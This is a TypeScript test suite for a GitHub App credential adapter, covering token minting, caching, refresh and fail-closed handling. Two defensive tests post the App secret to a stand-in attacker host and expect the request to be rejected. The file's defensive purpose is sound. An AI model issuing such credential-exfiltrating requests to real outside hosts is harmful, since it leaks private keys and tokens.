import { describe, expect, test } from "bun:test";
import { generateKeyPairSync } from "node:crypto";
import { createHttpCredentialProvider } from "@intx/harness";

import {
  githubRead,
  githubWrite,
} from "../../../../packages/github-tool/src/sidecar-bundle";
import { createGithubAppCredentialFetch, toRequest } from "./github-app-credential-adapter";

const API = "https://api.github.com";

function tokenExpiry(): string {
  return new Date(Date.now() + 60 * 60_000).toISOString();
}

function noContent(): Response {
  return new Response(null, { status: 204 });
}

function appSecret(): string {
  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  return JSON.stringify({
    appId: "123",
    privateKey: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
  });
}

describe("GitHub App credential adapter", () => {
  test("mints an installation token inside mediated fetch for read and write tools", async () => {
    const secret = appSecret();
    const apiAuthorizations: string[] = [];
    const calls: string[] = [];
    async function baseFetch(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      const url = new URL(request.url);
      calls.push(`${request.method} ${url.pathname}${url.search}`);
      const authorization = request.headers.get("authorization") ?? "";

      if (url.pathname === "/repos/octo/repo/installation") {
        expect(request.method).toBe("GET");
        expect(authorization).toMatch(/^Bearer eyJ/);
        expect(authorization).not.toContain("privateKey");
        return Response.json({ id: 456 });
      }

      if (url.pathname === "/app/installations/456/access_tokens") {
        expect(request.method).toBe("POST");
        expect(authorization).toMatch(/^Bearer eyJ/);
        expect(authorization).not.toContain("privateKey");
        return Response.json({
          token: "installation-token-for-test",
          expires_at: tokenExpiry(),
        });
      }

      apiAuthorizations.push(authorization);
      if (url.pathname.endsWith("/pulls") && request.method === "GET") {
        return Response.json([{ number: 7, title: "PR", user: { login: "octo" }, head: { sha: "abc" } }]);
      }
      if (url.pathname.endsWith("/pulls/7") && request.method === "GET") {
        return Response.json({ head: { sha: "abc" }, labels: [] });
      }
      if (url.pathname.endsWith("/issues/7/comments") && request.method === "GET") {
        return Response.json([]);
      }
      if (url.pathname.endsWith("/issues/7/comments") && request.method === "POST") {
        return Response.json({ id: 99 });
      }
      if (url.pathname.endsWith("/issues/7/labels") && request.method === "POST") {
        return Response.json([]);
      }
      throw new Error(`unexpected GitHub request ${request.method} ${request.url}`);
    }

    const provider = createHttpCredentialProvider({
      fetch: createGithubAppCredentialFetch({ apiOrigin: API, fetch: baseFetch }),
    });
    const mediated = provider.shape({
      origin: API,
      readCurrentMaterial() {
        return { secret };
      },
    });
    if (mediated.kind !== "http") throw new Error("expected HTTP credential");
    const credentials = {
      async resolve(handle: string) {
        if (handle !== "github") throw new Error(`unexpected credential ${handle}`);
        return mediated;
      },
    };
    const env = {
      capabilities: {
        resolve(name: string) {
          if (name !== "credentials") throw new Error(`unexpected capability ${name}`);
          return credentials;
        },
      },
    } as unknown as Parameters<typeof githubRead>[0];
    const read = await githubRead(env);
    const write = await githubWrite(env);

    const signal = new AbortController().signal;
    expect(await read.run({ id: "read", name: "github_list_open_prs", arguments: { repo: "octo/repo" } }, signal))
      .toMatchObject({ content: { prs: [{ number: 7 }] } });
    expect(await write.run({
      id: "write",
      name: "github_mirror",
      arguments: {
        repo: "octo/repo",
        number: 7,
        labels: ["triaged"],
        owned: [],
        comment: "Done",
        close: false,
      },
    }, signal)).toMatchObject({ content: { commentId: 99, closed: false, sha: "abc" } });

    expect(calls.filter((call) => call.includes("/access_tokens"))).toHaveLength(1);
    expect(calls.filter((call) => call.endsWith("/installation"))).toHaveLength(5);
    expect(apiAuthorizations).toEqual(Array(5).fill("Bearer installation-token-for-test"));
    expect(apiAuthorizations.join("\n")).not.toContain(secret);
  });

  test("discovers and caches installation tokens separately for each target repository", async () => {
    const secret = appSecret();
    const calls: string[] = [];
    async function github(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      const path = new URL(request.url).pathname;
      calls.push(`${request.method} ${path}`);
      if (path === "/repos/acme/one/installation") return Response.json({ id: 101 });
      if (path === "/repos/acme/two/installation") return Response.json({ id: 202 });
      if (path === "/app/installations/101/access_tokens") return Response.json({ token: "token-one", expires_at: tokenExpiry() });
      if (path === "/app/installations/202/access_tokens") return Response.json({ token: "token-two", expires_at: tokenExpiry() });
      if (path === "/repos/acme/one/pulls") {
        expect(request.headers.get("authorization")).toBe("Bearer token-one");
        return Response.json([]);
      }
      if (path === "/repos/acme/two/pulls") {
        expect(request.headers.get("authorization")).toBe("Bearer token-two");
        return Response.json([]);
      }
      throw new Error(`unexpected request ${request.method} ${path}`);
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: github });
    const headers = { authorization: `Bearer ${secret}` };

    await adapted(`${API}/repos/acme/one/pulls`, { headers });
    await adapted(`${API}/repos/acme/two/pulls`, { headers });
    await adapted(`${API}/repos/acme/one/pulls`, { headers });

    expect(calls.filter((call) => call.includes("/app/installations/101/access_tokens"))).toHaveLength(1);
    expect(calls.filter((call) => call.includes("/app/installations/202/access_tokens"))).toHaveLength(1);
  });

  test("resolves an organization installation and refreshes its token once after 401", async () => {
    const secret = appSecret();
    let mints = 0;
    async function github(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      const path = new URL(request.url).pathname;
      if (path === "/orgs/acme/installation") return Response.json({ id: 303 });
      if (path === "/app/installations/303/access_tokens") {
        mints += 1;
        return Response.json({ token: `org-token-${mints}`, expires_at: tokenExpiry() });
      }
      if (path === "/orgs/acme/members") {
        return new Response(null, { status: request.headers.get("authorization") === "Bearer org-token-1" ? 401 : 200 });
      }
      throw new Error(`unexpected request ${request.method} ${path}`);
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: github });

    const response = await adapted(`${API}/orgs/acme/members`, {
      headers: { authorization: `Bearer ${secret}` },
    });

    expect(response.status).toBe(200);
    expect(mints).toBe(2);
  });

  test("fails closed for a PAT and sends no GitHub request", async () => {
    let networkCalls = 0;
    async function countCalls(): Promise<Response> {
      networkCalls += 1;
      return noContent();
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: countCalls });

    await expect(adapted(`${API}/repos/octo/repo`, {
      headers: { authorization: "Bearer ghp_raw_token" },
    })).rejects.toThrow("GitHub App credential");
    expect(networkCalls).toBe(0);
  });

  test("preserves an ordinary non-App bearer for a non-GitHub origin", async () => {
    const authorizations: Array<string | null> = [];
    async function recordAuthorization(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      authorizations.push(toRequest(input, init).headers.get("authorization"));
      return noContent();
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: recordAuthorization });

    expect((await adapted("https://service.example/resource", {
      headers: { authorization: "Bearer ordinary-token" },
    })).status).toBe(204);
    expect(authorizations).toEqual(["Bearer ordinary-token"]);
  });

  test("never sends GitHub App JSON or its private key to a non-GitHub origin", async () => {
    const secret = appSecret();
    const observed: string[] = [];
    async function observe(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      observed.push(`${request.url}\n${request.headers.get("authorization") ?? ""}`);
      return noContent();
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: observe });

    await expect(adapted("https://attacker.example/collect", {
      headers: { authorization: `Bearer ${secret}` },
    })).rejects.toThrow("non-GitHub origin");
    expect(observed).toEqual([]);
    expect(observed.join("\n")).not.toContain(secret);
    expect(observed.join("\n")).not.toContain("PRIVATE KEY");
  });

  test("uses App JWT for App endpoints and strips the internal installation selector", async () => {
    const secret = appSecret();
    const seen: Array<{ path: string; authorization: string; selector: string | null }> = [];
    async function github(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      const path = new URL(request.url).pathname;
      seen.push({ path, authorization: request.headers.get("authorization") ?? "", selector: request.headers.get("x-corbits-github-installation-id") });
      if (path === "/app") return Response.json({ slug: "corbits" });
      if (path === "/app/installations/42/access_tokens") return Response.json({ token: "installation-token", expires_at: tokenExpiry() });
      if (path === "/installation/repositories") return Response.json({ repositories: [] });
      throw new Error(`unexpected ${path}`);
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: github });
    const authorization = `Bearer ${secret}`;
    await adapted(`${API}/app`, { headers: { authorization } });
    await adapted(`${API}/installation/repositories`, { headers: { authorization, "x-corbits-github-installation-id": "42" } });
    expect(seen[0]?.authorization).toMatch(/^Bearer eyJ/);
    expect(seen.at(-1)).toMatchObject({ path: "/installation/repositories", authorization: "Bearer installation-token", selector: null });
    expect(seen.some((call) => call.authorization.includes("privateKey"))).toBe(false);
  });

  test("mediates App JSON only for the configured origin", async () => {
    const origin = "http://127.0.0.1:4001";
    const secret = appSecret();
    const seen: string[] = [];
    async function emulator(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      seen.push(`${request.method} ${request.url}\n${request.headers.get("authorization") ?? ""}`);
      if (new URL(request.url).pathname === "/app") return Response.json({ slug: "corbits-triage" });
      throw new Error(`unexpected ${request.url}`);
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: origin, fetch: emulator });
    expect((await adapted(`${origin}/app`, { headers: { authorization: `Bearer ${secret}` } })).status).toBe(200);
    expect(seen.join("\n")).not.toContain("privateKey");
    expect(seen.join("\n")).not.toContain(secret);

    await expect(adapted(`${API}/app`, { headers: { authorization: `Bearer ${secret}` } })).rejects.toThrow("non-GitHub origin");
    await expect(adapted("https://attacker.example/collect", { headers: { authorization: `Bearer ${secret}` } })).rejects.toThrow("non-GitHub origin");
    expect(seen).toHaveLength(1);
  });
});
